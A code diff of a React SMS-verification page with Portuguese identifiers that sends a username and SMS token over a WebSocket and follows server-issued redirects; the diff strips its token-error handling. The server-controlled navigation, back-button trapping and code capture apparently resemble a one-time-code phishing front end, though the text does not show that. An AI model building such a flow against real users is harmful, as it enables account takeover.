@@ -18,17 +18,7 @@ const SMSPage = () => {
   const { send } = useWebSocket({
     reconectarPayload: { dispositivo },
     onRedirect: (msg) => {
-      const route = resolveServerRoute(msg.url);
-      if (route === "/erro-token") {
-        setEnviando(false);
-        const erroSalvo = localStorage.getItem("erroToken");
-        if (erroSalvo) {
-          setErro(erroSalvo);
-          localStorage.removeItem("erroToken");
-        }
-        return;
-      }
-      navigate(route);
+      navigate(resolveServerRoute(msg.url));
     },
     onMessage: (msg) => {
       if (msg.acao === "erro_chave") {
@@ -37,15 +27,6 @@ const SMSPage = () => {
       }
     },
   });
-
-  useEffect(() => {
-    const erroSalvo = localStorage.getItem("erroToken");
-    if (erroSalvo) {
-      setErro(erroSalvo);
-      setEnviando(false);
-      localStorage.removeItem("erroToken");
-    }
-  }, []);
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
@@ -78,7 +59,6 @@ const SMSPage = () => {
     setErro("");
     setEnviando(true);
     send({ acao: "token", usuario, token: chave.join("") });
-    localStorage.setItem("paginaOrigem", "/sms");
     navigate("/validando");
   };
 
